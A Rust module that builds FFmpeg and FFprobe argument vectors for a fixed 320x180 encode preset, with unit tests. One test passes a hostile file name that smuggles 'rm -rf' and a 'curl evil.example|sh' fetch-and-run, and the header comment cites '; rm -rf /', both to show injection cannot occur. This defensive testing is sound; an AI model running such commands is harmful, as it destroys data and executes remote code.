//! The encode configuration, expressed as an argv builder.
//!
//! Two properties this module exists to guarantee:
//!
//! 1. **No shell, ever.** [`Preset::ffmpeg_args`] returns argument vectors, and
//!    [`crate::process`] spawns them with `Command::args`. There is no string
//!    that is concatenated into a command line, so a fixture whose container
//!    metadata contains `; rm -rf /` is a filename and nothing more.
//! 2. **A preset is data.** The accepted configuration is a `const`, so the
//!    same value produces the same document in `/health`, the same argv, and the
//!    same golden fixture. Nothing reads it from a file, a request body or an
//!    environment variable at request time.
//!
//! Determinism: `bitexact` flags remove encoder version strings and run metadata
//! so the same input produces the same bytes on the same FFmpeg build. That is
//! reproducibility on one host, not across hosts: FFmpeg's output depends on the
//! version and the CPU flags it was built with, which is why the shipped
//! dependency is a pinned package version and the output hash is reported as an
//! integrity value, not a content address.

use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::time::Duration;

use crate::error::{ErrorCode, ProcessorError, Result};
use crate::protocol::{PresetSummary, MAX_ENCODE_THREADS, PRESET_ID};

/// A complete, immutable encode configuration.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Preset {
    pub id: &'static str,
    pub width: u32,
    pub height: u32,
    pub fps: u32,
    pub video_codec: &'static str,
    pub video_encoder: &'static str,
    pub encoder_preset: &'static str,
    pub crf: u32,
    pub pixel_format: &'static str,
    pub h264_profile: &'static str,
    pub audio_codec: Option<&'static str>,
    pub audio_bitrate: &'static str,
    pub container: &'static str,
    /// Acceptable probed duration, inclusive.
    ///
    /// This is a sanity window, not a fingerprint of the demo fixture. The floor
    /// exists because the classic false success is a file that encoded one frame:
    /// it has the right codec and the right geometry and is useless. The ceiling
    /// exists because an input that loops for hours will happily consume the
    /// whole deadline inside a container being billed by the second.
    ///
    /// An earlier version of this preset pinned the window to the fixture's three
    /// seconds. That made every input other than the demo fixture fail
    /// validation, which contradicted the CLI's purpose: the CLI exists to encode
    /// local files, and the same preset should mean the same thing in both
    /// entrypoints. Admission of *which* input is a protocol decision made by the
    /// caller (only fixture `sample-v1` is admitted), not something a duration
    /// window should be doing.
    pub min_duration_ms: u64,
    pub max_duration_ms: u64,
    pub deadline: Duration,
    pub threads: u32,
}

/// The one accepted preset: 320x180 H.264/AAC in MP4, CFR 24 fps.
pub const DEMO_180P_V1: Preset = Preset {
    id: PRESET_ID,
    width: 320,
    height: 180,
    fps: 24,
    video_codec: "h264",
    video_encoder: "libx264",
    encoder_preset: "medium",
    crf: 23,
    pixel_format: "yuv420p",
    h264_profile: "baseline",
    audio_codec: Some("aac"),
    audio_bitrate: "64k",
    container: "mp4",
    min_duration_ms: 1_000,
    max_duration_ms: 60_000,
    deadline: Duration::from_millis(crate::protocol::ENCODE_DEADLINE_MS),
    threads: MAX_ENCODE_THREADS,
};

/// Every preset this build implements. One today; the lookup is a table so a
/// second preset is additive and still refuses everything else.
pub const PRESETS: &[Preset] = &[DEMO_180P_V1];

/// Resolve a preset id, or refuse it.
///
/// The comparison is exact: no case folding, no trimming, no prefix matching. An
/// unknown id is a terminal error, because a caller that reached the wrong
/// process should hear about it rather than be served a default.
pub fn lookup(id: &str) -> Result<&'static Preset> {
    PRESETS
        .iter()
        .find(|preset| preset.id == id)
        .ok_or_else(|| {
            ProcessorError::new(ErrorCode::UnsupportedPreset)
                .with_detail(format!("requested: {id}"))
        })
}

impl Preset {
    /// The document a caller sees in `/health`.
    pub fn summary(&self) -> PresetSummary {
        PresetSummary {
            id: self.id.to_string(),
            width: self.width,
            height: self.height,
            fps: self.fps,
            video_codec: self.video_codec.to_string(),
            audio_codec: self.audio_codec.map(str::to_string),
            container: self.container.to_string(),
        }
    }

    /// FFmpeg arguments for one encode. Returns owned values so non-UTF-8 paths
    /// are passed through untouched instead of being lossy-converted.
    ///
    /// Ordering is fixed and documented because it is part of the contract's
    /// testable surface: global flags, then input, then stream mapping, then
    /// codec settings, then container settings, then output.
    pub fn ffmpeg_args(&self, input: &Path, output: &Path) -> Vec<OsString> {
        // A local macro rather than a closure: the argv also receives
        // `OsString`s borrowed from paths, which a `&str` closure cannot accept
        // and which would have to be copied through a string to unify.
        let mut args: Vec<OsString> = Vec::with_capacity(32);
        macro_rules! push {
            ($value:expr) => {
                args.push(OsString::from($value))
            };
        }

        // Global. `-nostdin` matters more than it looks: without it FFmpeg
        // reads stdin, and a server process whose stdin is a socket or a closed
        // pipe can block on a control character instead of encoding.
        push!("-hide_banner");
        push!("-nostdin");
        push!("-loglevel");
        push!("error");
        // A container temp path is ours and is empty; FFmpeg must not prompt.
        push!("-y");

        push!("-i");
        args.push(input.as_os_str().to_os_string());

        // One video stream, and the first audio stream if the input has one.
        // `-f mp4` on the output side would be more explicit; the `.mp4`
        // extension we control selects it.
        push!("-map");
        push!("0:v:0");
        push!("-map");
        push!("0:a:0?");

        push!("-c:v");
        push!(self.video_encoder);
        push!("-preset");
        push!(self.encoder_preset);
        push!("-crf");
        push!(self.crf.to_string());
        push!("-pix_fmt");
        push!(self.pixel_format);
        push!("-profile:v");
        push!(self.h264_profile);
        push!("-r");
        push!(self.fps.to_string());
        // A fixed geometry regardless of the input's aspect ratio, letterboxed
        // and centred, so the output dimensions are a property of the preset
        // rather than of the input. `setsar=1` because a non-square sample
        // aspect ratio makes two players disagree about the frame size.
        push!("-vf");
        push!(self.filter_chain());
        push!("-threads");
        push!(self.threads.to_string());
        push!("-filter_threads");
        push!("1");
        push!("-fps_mode");
        push!("cfr");

        if let Some(audio_codec) = self.audio_codec {
            push!("-c:a");
            push!(audio_codec);
            push!("-b:a");
            push!(self.audio_bitrate);
            push!("-ac");
            push!("2");
            push!("-ar");
            push!("44100");
        } else {
            push!("-an");
        }

        // Do not carry input metadata or chapters into the output: they are
        // attacker-controlled strings that would otherwise survive the encode.
        push!("-map_metadata");
        push!("-1");
        push!("-map_chapters");
        push!("-1");
        push!("-fflags");
        push!("+bitexact");
        push!("-flags:v");
        push!("+bitexact");
        push!("-flags:a");
        push!("+bitexact");
        push!("-movflags");
        push!("+faststart");

        args.push(output.as_os_str().to_os_string());
        args
    }

    /// The filter graph: scale to fit, pad to the exact frame, square pixels.
    fn filter_chain(&self) -> String {
        format!(
            "scale={w}:{h}:force_original_aspect_ratio=decrease:flags=bicubic,\
             pad={w}:{h}:(ow-iw)/2:(oh-ih)/2:color=black,setsar=1",
            w = self.width,
            h = self.height
        )
    }

    /// The FFprobe arguments that measure a produced file. Separate from
    /// FFmpeg's argv so validation can be re-run against any file, including one
    /// a caller produced with the CLI.
    pub fn ffprobe_args(file: &Path) -> Vec<OsString> {
        vec![
            OsString::from("-v"),
            OsString::from("error"),
            OsString::from("-print_format"),
            OsString::from("json"),
            OsString::from("-show_format"),
            OsString::from("-show_streams"),
            file.as_os_str().to_os_string(),
        ]
    }

    /// Output path inside `directory` for this preset. Fixed name: the temp
    /// directory is per-request, so a fixed name is unambiguous and cannot
    /// collide with a caller-chosen path.
    pub fn output_path(&self, directory: &Path) -> PathBuf {
        directory.join("output.mp4")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args_as_strings(args: &[OsString]) -> Vec<String> {
        args.iter()
            .map(|a| a.to_string_lossy().into_owned())
            .collect()
    }

    #[test]
    fn argv_is_a_vector_containing_no_shell_metacharacters_from_the_input_path() {
        // The input name is what a hostile container would choose. It reaches
        // argv as one element and stays one element: there is no shell to split
        // it, and nothing in the encoder concatenates it into a string.
        let hostile = PathBuf::from("/tmp/x; rm -rf /tmp/$(whoami) && curl evil.example|sh.mp4");
        let args = DEMO_180P_V1.ffmpeg_args(&hostile, Path::new("/tmp/out.mp4"));
        let index = args
            .iter()
            .position(|a| a == "-i")
            .expect("input flag present");
        assert_eq!(args[index + 1], hostile.as_os_str());
        // Exactly one element carries the hostile text, and it is the path.
        let occurrences = args
            .iter()
            .filter(|a| a.to_string_lossy().contains("rm -rf"))
            .count();
        assert_eq!(occurrences, 1);
    }

    #[test]
    fn argv_pins_geometry_codec_and_thread_budget() {
        let args = args_as_strings(
            &DEMO_180P_V1.ffmpeg_args(Path::new("/tmp/in.mp4"), Path::new("/tmp/out.mp4")),
        );
        assert_eq!(args.first().map(String::as_str), Some("-hide_banner"));
        assert!(args.contains(&"-nostdin".to_string()), "{args:?}");
        assert!(args.contains(&"libx264".to_string()), "{args:?}");
        assert!(args.contains(&"baseline".to_string()), "{args:?}");
        assert!(args.contains(&"yuv420p".to_string()), "{args:?}");
        assert!(args.contains(&"+faststart".to_string()), "{args:?}");
        // The thread budget is an argument, not an environment guess.
        let threads = args.iter().position(|a| a == "-threads").expect("-threads");
        assert_eq!(args[threads + 1], MAX_ENCODE_THREADS.to_string());
        // The filter graph contains the exact output frame.
        let filter = args
            .iter()
            .find(|a| a.contains("pad="))
            .expect("filter chain");
        assert!(filter.contains("pad=320:180"), "{filter}");
        assert!(filter.contains("setsar=1"), "{filter}");
        assert_eq!(args.last().map(String::as_str), Some("/tmp/out.mp4"));
    }

    #[test]
    fn unknown_preset_is_terminal_and_not_a_default() {
        let error = lookup("demo-180p-v2").unwrap_err();
        assert_eq!(error.code(), ErrorCode::UnsupportedPreset);
        assert!(!error.code().retryable());
        // Near-misses are refused too: an exact id is the contract.
        assert!(lookup("DEMO-180P-V1").is_err());
        assert!(lookup(" demo-180p-v1").is_err());
        assert!(lookup(PRESET_ID).is_ok());
    }

    #[test]
    fn only_one_preset_is_implemented() {
        assert_eq!(PRESETS.len(), 1);
        assert_eq!(DEMO_180P_V1.id, "demo-180p-v1");
        assert_eq!(DEMO_180P_V1.width, 320);
        assert_eq!(DEMO_180P_V1.height, 180);
        assert_eq!(DEMO_180P_V1.threads, 2);
    }
}
